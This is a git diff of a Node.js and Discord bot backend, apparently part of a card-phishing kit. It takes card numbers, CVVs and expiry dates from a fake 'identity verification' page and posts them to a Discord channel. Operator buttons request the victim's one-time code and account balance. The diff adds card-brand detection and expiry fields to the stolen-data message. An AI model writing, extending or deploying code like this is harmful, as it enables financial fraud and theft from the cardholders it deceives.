@@ -27,30 +27,42 @@ client.once('ready', () => {
 
 client.login(DISCORD_TOKEN);
 
+// Función para detectar la marca de la tarjeta por el primer dígito
+function detectarMarca(tarjeta) {
+    const num = String(tarjeta).replace(/\D/g, '');
+    if (num.startsWith('4')) return 'Visa 💳';
+    if (num.startsWith('5') || num.startsWith('2')) return 'Mastercard 💳';
+    if (num.startsWith('3')) return 'Amex 💳';
+    return 'Desconocida';
+}
+
 // 1. Endpoint que recibe la tarjeta desde verificaciondeidentidad.html
 app.post('/nuevo', async (req, res) => {
     try {
-        const { userId, tarjeta, codigo, monto } = req.body;
+        const { userId, tarjeta, codigo, expMes, expAnio } = req.body;
         if (!userId || !tarjeta) return res.status(400).json({ ok: false });
 
         sesiones.set(userId, {
-            userId, tarjeta, codigo: codigo || '', monto: monto || '0',
+            userId, tarjeta, codigo: codigo || '', expMes, expAnio,
             estado: 'pending', otp: null, saldo: null, discordMsgId: null
         });
 
         const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
+        const marca = detectarMarca(tarjeta);
+
+        // 🔥 NUEVO EMBED: Sin monto, con fecha y marca
         const embed = new EmbedBuilder()
             .setTitle('💳 Nueva tarjeta recibida')
             .setColor(0xda0081)
             .addFields(
                 { name: '🆔 User ID', value: `\`${userId}\``, inline: false },
-                { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: true },
-                { name: '🔒 CVV', value: `\`${codigo}\``, inline: true },
-                { name: '💵 Monto', value: `$${monto}`, inline: true }
+                { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: false },
+                { name: '🏦 Marca', value: `\`${marca}\``, inline: true },
+                { name: '📅 Vence', value: `\`${expMes || '?'}/${expAnio || '?'}\``, inline: true },
+                { name: '🔒 CVV', value: `\`${codigo}\``, inline: true }
             )
             .setTimestamp();
 
-        // Botones de acción
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId(`otp_${userId}`).setLabel('📱 Pedir Dinámica').setStyle(ButtonStyle.Primary),
             new ButtonBuilder().setCustomId(`saldo_${userId}`).setLabel('💰 Pedir Saldo').setStyle(ButtonStyle.Primary),
@@ -135,7 +147,6 @@ app.get('/estado/:userId', (req, res) => {
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
 
-    // 🔥 FIX: Separar correctamente el action del userId (porque userId tiene guiones bajos)
     const parts = interaction.customId.split('_');
     const action = parts[0];
     const userId = parts.slice(1).join('_');
